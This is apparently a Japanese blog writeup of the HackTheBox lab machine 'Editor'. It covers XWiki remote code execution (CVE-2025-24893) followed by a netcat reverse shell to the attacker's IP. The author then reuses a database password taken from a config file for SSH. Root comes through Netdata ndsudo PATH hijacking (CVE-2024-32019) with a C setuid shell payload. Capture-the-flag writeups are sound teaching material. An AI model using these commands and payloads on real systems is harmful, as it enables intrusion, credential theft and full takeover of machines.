---
title: 'Editor'
description: 'HackTheBox MachineのWriteup'
pubDate: 2026-03-03T19:50:00+09:00
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'XWiki', 'CVE-2025-24893', 'Netdata', 'CVE-2024-32019']
---

# Editor - HackTheBox

## 初期調査

WEBサイトにアクセスすると #Docs #About があり、#Docs にアクセスすると wiki.editor.htb/xwiki を使用したログインフォームがある

`XWiki Debian 15.10.8` このバージョンの脆弱性を調べてみると `CVE-2025-24893` が有効だった

```bash
$ python3 CVE-2025-24893.py --url http://wiki.editor.htb/xwiki --command "id"
[*] Sending request to web server
[+] Output:

uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)
```

```bash
# tty01
python3 CVE-2025-24893.py --url http://wiki.editor.htb/xwiki --command "busybox nc 10.10.14.40 4444 -e /bin/bash"

# tty02
nc -lnvp 4444

pwd
/usr/lib/xwiki-jetty

ls -la
total 72
drwxr-xr-x  5 root root  4096 Jul 29  2025 .
drwxr-xr-x 91 root root  4096 Jul 29  2025 ..
drwxr-xr-x  6 root root  4096 Jul 29  2025 jetty
lrwxrwxrwx  1 root root    14 Mar 27  2024 logs -> /var/log/xwiki
drwxr-xr-x  2 root root  4096 Jul 29  2025 start.d
-rw-r--r--  1 root root  5551 Mar 27  2024 start_xwiki.bat
-rw-r--r--  1 root root  6223 Mar 27  2024 start_xwiki_debug.bat
-rw-r--r--  1 root root 10530 Mar 27  2024 start_xwiki_debug.sh
-rw-r--r--  1 root root  9340 Mar 27  2024 start_xwiki.sh
-rw-r--r--  1 root root  2486 Mar 27  2024 stop_xwiki.bat
-rw-r--r--  1 root root  6749 Mar 27  2024 stop_xwiki.sh
drwxr-xr-x  3 root root  4096 Jun 13  2025 webapps

cat /etc/passwd
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

認証情報が書かれてそうなファイルを調べてみた  
DBのパスワードをそのままSSHで使用した

```bash
# webapps/xwiki/WEB-INF/hibernate.cfg.xml

default schema for schema based
         engines) you will also have to set the property xwiki.db in xwiki.cfg file
    >
    jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true
    xwiki
    theEd1t0rTeam99
    com.mysql.cj.jdbc.Driver
    true
    20    UTF-8
    true
    utf8
```

### SSHアクセス
```bash
$ ssh oliver@10.129.231.23 # theEd1t0rTeam99

oliver@editor:~$ ls
user.txt
```

## 権限昇格

sビットを調べてみると netdata が使われていた

> Netdataとは  
リアルタイムのシステム・アプリケーション監視ツールでサーバーの状態をブラウザから見やすいダッシュボードで確認できる


```bash
oliver@editor:~$ find / -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

netdata のデフォルトポートは 19999

```bash
oliver@editor:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:39459         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:19999         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8125          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp6       0      0 :::8080                 :::*                    LISTEN
tcp6       0      0 127.0.0.1:8079          :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
udp        0      0 127.0.0.1:8125          0.0.0.0:*
udp        0      0 127.0.0.53:53           0.0.0.0:*
udp        0      0 0.0.0.0:68              0.0.0.0:*
```

`v1.45.2` 脆弱性を調べてみると `CVE-2024-32019` が有効だった

```bash
oliver@editor:~$ nc 127.0.0.1 19999

HTTP/1.1 400 Bad Request
Connection: close
Server: Netdata Embedded HTTP Server v1.45.2
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Date: Tue, 03 Mar 2026 10:11:04 GMT
Content-Type: text/plain; charset=utf-8
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: Tue, 03 Mar 2026 10:11:04 GMT
Content-Length: 43
X-Transaction-ID: 2f1d6295aef141f68009b246147518fe
```

```bash
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf
  Parameters : GETCONFIG 1 PD
```

```bash
oliver@editor:/tmp$ ls -la
total 48
drwxrwxrwt  8 root    root     4096 Mar  3 09:55 .
drwxr-xr-x 18 root    root     4096 Jul 29  2025 ..
-rwxrwxr-x  1 oliver  oliver  15576 Mar  3 09:55 arcconf

oliver@editor:/tmp$ PATH=/tmp:$PATH

oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo arcconf-pd-info
root@editor:/tmp# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)

root@editor:/tmp# ls /root
root.txt  scripts  snap
```

```c
// arcconf.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", "-p", NULL);
  perror("execl");
  return 1;
}
```